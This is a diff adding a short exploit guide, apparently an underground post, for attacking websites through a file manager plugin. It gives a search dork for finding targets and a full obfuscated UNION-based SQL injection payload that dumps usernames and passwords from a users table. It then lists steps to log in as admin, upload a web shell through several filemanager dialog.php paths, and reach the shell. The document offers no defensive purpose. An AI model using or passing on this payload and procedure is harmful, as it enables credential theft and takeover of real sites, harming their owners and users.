@@ -1,0 +1,23 @@
+FILEMANAGER W/ SQL Injection
+
+Author : SPEEDY-03
+
+DORK :
+inurl:/wp-content/source/
+
+exploit :
+site.com/berita-bla-bla-4--bla'+UNION+ALL+SELECT+1,2,3,expo…(5,@:=0,(select+count(*)/*!50000from*/+/*!50000users+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000username*/,2),0x3a3a,/*!50000password*/,2)),@,2),5,6,7,8,9,10,11,12,13,14--+.html
+
+STEP :
+-site.com/brita-bla-bla-4-bla.html
+-inject use ( '+UNION+ALL+SELECT+1,2,3,export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000users+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000username*/,2),0x3a3a,/*!50000password*/,2)),@,2),5,6,7,8,9,10,11,12,13,14--+ )
+
+-input " - " in back -bla
+EXAMPLE brita-bla-bla-4--bla(UR INJECTION).html
+-login admin /sysadmin/
+-upload shell in filemanager
+/wp-content/tinymce/filemanager/dialog.php
+/wp-content/filemanager/dialog.php
+/wp-content/tinymce/plugins/filemanager/dialog.php
+
+ur shell in site.com/wp-content/source/
